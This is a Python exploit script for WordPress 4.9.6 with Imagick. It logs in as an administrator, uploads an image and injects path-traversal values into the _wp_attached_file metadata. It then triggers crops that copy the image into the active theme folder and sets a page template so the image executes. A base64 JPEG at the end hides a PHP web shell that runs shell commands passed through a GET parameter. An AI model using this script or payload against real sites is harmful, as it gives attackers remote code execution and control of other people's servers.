import requests
from bs4 import BeautifulSoup as BS
import base64
from datetime import datetime 
from urllib.parse import urlparse
from io import StringIO
import csv
import re

#Tested and works with WP-4.9.6 with imagick. GD and vanilla not tested
#Need to get a better way to get the ajax token. Probably through the heartbeat variable

url = 'http://localhost/'
username = 'admin'
pwd = 'admin'
payloadName = 'picture.jpg'

def grabFileNameAfterUpload(url):
	htmlDoc = s.get(url)
	soup = BS(htmlDoc.content,features='html.parser')
	soup.prettify()
	fileName = soup.find_all(p,{'class':'filename'})
	print(fileName)

def grabCSRFToken(url):
	htmlDoc = s.get(url)
	
	soup = BS(htmlDoc.content,features='html.parser')
	
	form = soup.find('form')
	#print(form)
	#print(form.find_all('input'))
	csrfToken = form.find('input',{'id':'_wpnonce'})['value']
	return csrfToken


def grabTheme(url):
	htmlDoc = requests.get(url)
	soup = BS(htmlDoc.content,features='html.parser')
	links = soup.find_all('link', {'rel':'stylesheet'})
	for link in links:
		'''
		parsed = urlparse(link['href'])
		pos = parsed.path.find('themes')
		print(pos)
		'''
		parsed = urlparse(link['href'])
		pos = parsed.path.find('themes')
		if(pos != -1):
			path = parsed.path[pos:]
			f = StringIO(path)
			reader = csv.reader(f,delimiter='/')
			return next(reader)[1]
		
				
def grabCSRFTokenEdit(url):
	response = s.get(url)
	#Yanking the CSRF Token out the hardway :v
	soup=BS(response.content,features='html.parser')
	form = soup.find_all('form')
	csrfToken = form[1].find('input',{'id':'_wpnonce'})['value']
	return csrfToken
	
def grabAjaxCSRFToken(url):
	#Fetches the token from the edit button. Will not work if imagick is not installed
	response = s.get(url)
	#Yanking the CSRF Token out the hardway :v
	soup=BS(response.content,features='html.parser')
	inputs = []
	paragraphs = soup.find_all('p')
	for paragraph in paragraphs:
		input = paragraph.find('input')
		if input != None:
			inputs.append(input)
	string = inputs[0]['onclick']
	matchObj = re.search( r'\b[a-z0-9]{10}\b',string)
	return matchObj.group()
	
def grabNewPostId(soup):
	form = soup.find('form',{'name':'post'})
	#print(form)
	post_Id = form.find('input',{'id':'post_ID'})['value']
	return post_Id
	
s = requests.session()


with (s):
	#-----------------------------------------------#
	#Grab the theme
	theme = grabTheme(url)
	print('[+] Grabbed the theme')
	print(theme)
	
	
	#-----------------------------------------------#
	#Logs in to the admin site with creds
	creds = {
		'log': username,
		'pwd': pwd,
		'wp-submit':'Log+In'
	}
	s.post(url+'wp-login.php', creds)
	print('[+] Logged in with creds')
	
	
	#-----------------------------------------------#
	#Upload an image
	uploadData = {
		'name':'evil.jpg',
		'post_id': 0, # Always be like this since this is an upload?
		'_wpnonce': grabCSRFToken(url+'wp-admin/media-new.php'), #Rip from the page :v
		'short': 1,
		'type': 'pepega',
		'tab' : 'pepehands',
	}
	#Maybe write payload to path?
	
	payload = {'async-upload':open(payloadName,'rb')} 
	response =  s.post(url+'wp-admin/async-upload.php',files=payload,data=uploadData)
	postId = response.content.decode('ascii')
	print('[+] Image Uploaded. postID='+postId)
	
	
	#-----------------------------------------------#
	input('Enter to continue...')
	
	#Edit the image and inject _wp_attachment_file
	#This header is also necessary for ajax requests (or not?)
	header ={
		'Referer': url+'wp-admin/post.php?post='+postId+'&action=edit'
	}
	editData = {
		'_wpnonce': grabCSRFTokenEdit(url+'wp-admin/post.php?post='+postId+'&action=edit'),
		'action': 'editpost',
		'post_ID': postId,
		'post_title': 'lul',
		'meta_input[_wp_attached_file]': datetime.today().strftime('%Y')+'/'+datetime.today().strftime('%m')+'/'+payloadName+'?/helper'
	}
	
	s.post(url+'wp-admin/post.php',data=editData,headers=header)
	print('[+]_wp_attachment_file injected to create the helper directory')
	
	
	#-----------------------------------------------#
	input('Enter to continue...')
	#Initiate a crop. Creates directory 'uploads/(year)/(month)/"payloadName"."?"
	cropData ={
		'action': 'crop-image',
		'_ajax_nonce': grabAjaxCSRFToken(url+'wp-admin/post.php?post='+postId+'&action=edit'), #nonce is correct
		'id': postId,
		'cropDetails[width]': 600,
		'cropDetails[height]': 600,		#An array containing the dimension x,y,width,height,dst_width,dst_height
	}
	#url = 'http://192.168.94.133:8002/'
	response = s.post(url+'wp-admin/admin-ajax.php',data=cropData)
	print('[+]Crop initiated for helper directory')
	print(BS(response.content,features='html.parser').prettify())
	
	
	#-----------------------------------------------#
	input('Enter to continue...')
	editData = {
		'_wpnonce': grabCSRFTokenEdit(url+'wp-admin/post.php?post='+postId+'&action=edit'),
		'action': 'editpost',
		'post_ID': postId,
		'post_title': 'lul',
		'meta_input[_wp_attached_file]': datetime.today().strftime('%Y')+'/'+datetime.today().strftime('%m')+'/'+payloadName+'?/../../../../themes/'+theme+'/lol'
	}
	
	s.post(url+'wp-admin/post.php',data=editData,headers=header)
	print('[+]_wp_attachment_file injected to create the payload in the theme folder')
	
	
	#-----------------------------------------------#
	input('Enter to continue...')
	#Initiate another crop
	cropData ={
		'action': 'crop-image',
		'_ajax_nonce': grabAjaxCSRFToken(url+'wp-admin/post.php?post='+postId+'&action=edit'), #nonce is correct
		'id': postId,
		'cropDetails[width]': 600,
		'cropDetails[height]': 600,		#An array containing the dimension x,y,width,height,dst_width,dst_height
	}
	
	response = s.post(url+'wp-admin/admin-ajax.php',data=cropData)
	print('[+]Crop initiated for actual payload')
	print(BS(response.content,features='html.parser').prettify())
	
	
	#-----------------------------------------------#
	#Grab the new post page
	response = s.get(url+'wp-admin/post-new.php')
	soup = BS(response.content,features='html.parser')
	#Grab the generated postId
	postId = grabNewPostId(soup)
	#Grab the CSRF token on the existing page
	form = soup.find_all('form')
	csrfToken = form[1].find('input',{'id':'_wpnonce'})['value']
	#Publish the post
	input('Enter to continue...')
	header ={
		'Referer': url+'wp-admin/post-new.php'
	}
	publishData = {
		'publish':'Publish',
		'action':'editpost',
		#'_wpnonce': grabCSRFTokenEdit(url+'wp-admin/post-new.php'), #This grab is valid
		'_wpnonce': csrfToken,
		'post_ID':  postId,
		'visibility':'public',
		'post_title': 'LUL',
		'status': 'draft',
		'post_author_override':1,
		'post_password':'wootwoot',
		'meta_input[_wp_page_template]': 'cropped-lol.jpg',
	}
	#url = 'localhost:8002/'
	response = s.post(url+'wp-admin/post.php',data=publishData,headers=header);
	#print(BS(response.content,features='html.parser').prettify())
	print('Visit the newly published post "LUL" to trigger the payload. The password is "wootwoot"')
	
'''
picture.jpg in base64:

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
dsf8Zzj/AK/f6Ndauv/Z
'''
	